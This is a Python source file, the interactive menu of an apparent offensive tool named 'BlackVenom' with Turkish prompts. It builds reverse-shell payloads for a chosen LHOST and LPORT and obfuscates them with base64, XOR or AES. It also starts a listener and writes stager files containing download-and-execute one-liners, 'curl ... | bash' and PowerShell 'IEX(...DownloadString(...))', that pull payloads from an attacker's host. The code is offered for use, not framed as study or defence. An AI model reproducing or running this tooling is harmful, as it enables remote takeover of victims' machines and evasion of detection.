import sys
import os
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

from core.builder import build_payload
from core.listener import start_listener
from utils.logger import log_event
from utils.config import PAYLOAD_OUTPUT_DIR
from encoders.base64 import encode as base64_encode
from encoders.xor import xor_encrypt
from encoders.aes import aes_encrypt


def banner():
    print(r"""
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗██╗░░░██╗███████╗███╗░░██╗░█████╗░███╗░░░███╗
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝╚██╗░██╔╝██╔════╝████╗░██║██╔══██╗████╗░████║
██████╦╝██║░░░░░███████║███████║█████═╝░░╚████╔╝░█████╗░░██╔██╗██║██║░░██║██╔████╔██║
██╔══██╗██║░░░░░██╔══██║██╔══██║██╔═██╗░░░╚██╔╝░░██╔══╝░░██║╚████║██║░░██║██║╚██╔╝██║
██████╦╝███████╗██║░░██║██║░░██║██║░╚██╗░░░██║░░░███████╗██║░╚███║╚█████╔╝██║░╚═╝░██║
╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░░░░╚═╝
    """)


def get_input(prompt, default):
    val = input(f"{prompt} [{default}]: ")
    return val.strip() if val.strip() else default


def payload_generator():
    print("\n[+] Payload Oluşturucu\n")
    platform = get_input("Platform (linux/windows/custom)", "linux")
    shell_type = get_input("Shell tipi (bash/python/powershell/etc)", "bash")
    ip = get_input("LHOST (dinleyen IP)", "127.0.0.1")
    port = int(get_input("LPORT (dinleyen port)", "4444"))
    encoder = get_input("Encoder (none/base64/xor/aes)", "none").lower()

    key = None
    if encoder in ["xor", "aes"]:
        key = get_input("Şifreleme anahtarı", "BlackVenomFTW")

    template = None
    if platform == "custom":
        print("\nCustom payload içinde '{{IP}}' ve '{{PORT}}' olmalı.")
        template = input("Template'i gir: ")

    print("\n[+] Payload oluşturuluyor...\n")
    payload = build_payload(platform, ip, port, shell_type, encoder if encoder != "none" else None, key, template)
    print("\n🔥 Oluşturulan Payload:\n")
    print(payload)

    log_event(f"{platform.upper()} payload oluşturuldu | {shell_type} | {ip}:{port} | encoder={encoder}")

    if get_input("Payload'ı kaydetmek ister misin? (y/n)", "y").lower() == "y":
        if not os.path.exists(PAYLOAD_OUTPUT_DIR):
            os.makedirs(PAYLOAD_OUTPUT_DIR)
        filename = f"{PAYLOAD_OUTPUT_DIR}{platform}_{shell_type}_{ip}_{port}.txt".replace(":", "_")
        with open(filename, "w") as f:
            f.write(payload)
        print(f"[✓] Payload kaydedildi: {filename}")

        if get_input("Bu payload ile otomatik stager dosyaları oluşturulsun mu? (y/n)", "y").lower() == "y":
            bash_stager = f"curl http://{ip}/{filename.split('/')[-1]} | bash"
            ps_stager = f"powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}/{filename.split('/')[-1]}')\""
            bat_stager = f"@echo off\npowershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}/{filename.split('/')[-1]}')\""

            with open(os.path.join(PAYLOAD_OUTPUT_DIR, "auto_stager.sh"), "w") as f:
                f.write(bash_stager + "\n")
            with open(os.path.join(PAYLOAD_OUTPUT_DIR, "auto_stager.ps1"), "w") as f:
                f.write(ps_stager + "\n")
            with open(os.path.join(PAYLOAD_OUTPUT_DIR, "auto_stager.bat"), "w") as f:
                f.write(bat_stager + "\n")
            print("[✓] Otomatik stager dosyaları oluşturuldu!")


def encoder_tools():
    print("\n[+] Encoder Test Modülü\n")
    data = input("Encode edilecek payload: ")
    enc = get_input("Encoder tipi (base64/xor/aes)", "base64").lower()
    result = ""

    if enc == "base64":
        result = base64_encode(data)
    elif enc == "xor":
        key = input("Anahtar: ")
        result = xor_encrypt(data, key)
    elif enc == "aes":
        key = input("Anahtar: ")
        result = aes_encrypt(data, key)

    print("\n[✓] Encode edilmiş string:")
    print(result)


def start_listener_menu():
    print("\n[+] Listener Başlat\n")
    ip = get_input("Dinleme IP", "0.0.0.0")
    port = int(get_input("Dinleme Port", "4444"))
    start_listener(ip, port)


def stager_menu():
    print("\n[+] Stager Oluşturucu\n")
    url = get_input("Payload URL", "http://your-ip/payload.sh")

    bash_stager = f"curl {url} | bash"
    ps_stager = f"powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('{url}')\""
    bat_stager = f"@echo off\npowershell -Command \"IEX(New-Object Net.WebClient).DownloadString('{url}')\""

    print("\nStager (bash):")
    print(bash_stager)
    print("\nStager (powershell):")
    print(ps_stager)
    print("\nStager (.bat):")
    print(bat_stager)

    save = get_input("Bu stager'ları dosya olarak kaydetmek ister misin? (y/n)", "y").lower()
    if save == "y":
        if not os.path.exists(PAYLOAD_OUTPUT_DIR):
            os.makedirs(PAYLOAD_OUTPUT_DIR)
        with open(os.path.join(PAYLOAD_OUTPUT_DIR, "stager.sh"), "w") as f:
            f.write(bash_stager + "\n")
        with open(os.path.join(PAYLOAD_OUTPUT_DIR, "stager.ps1"), "w") as f:
            f.write(ps_stager + "\n")
        with open(os.path.join(PAYLOAD_OUTPUT_DIR, "stager.bat"), "w") as f:
            f.write(bat_stager + "\n")
        print("\n[✓] Stager dosyaları kaydedildi!")


def view_logs():
    print("\n[+] Log Dosyası:\n")
    log_file = os.path.join(PAYLOAD_OUTPUT_DIR.replace("generated_payloads", "blackvenom_logs"), "venom.log")
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            print(f.read())
    else:
        print("Log dosyası bulunamadı.")


def main():
    while True:
        banner()
        print("\n1. Payload Oluştur")
        print("2. Encoder Araçları")
        print("3. Listener Başlat")
        print("4. Stager Oluştur")
        print("5. Logları Görüntüle")
        print("0. Çıkış")
        secim = input("\nSeçiminiz: ")

        if secim == "1":
            payload_generator()
        elif secim == "2":
            encoder_tools()
        elif secim == "3":
            start_listener_menu()
        elif secim == "4":
            stager_menu()
        elif secim == "5":
            view_logs()
        elif secim == "0":
            print("\n[!] BlackVenom kapatılıyor... 🐍")
            break
        else:
            print("\n[!] Geçersiz seçim. Lütfen tekrar deneyin.")

        input("\nDevam etmek için Enter...\n")
        os.system("clear")


if __name__ == "__main__":
    main()
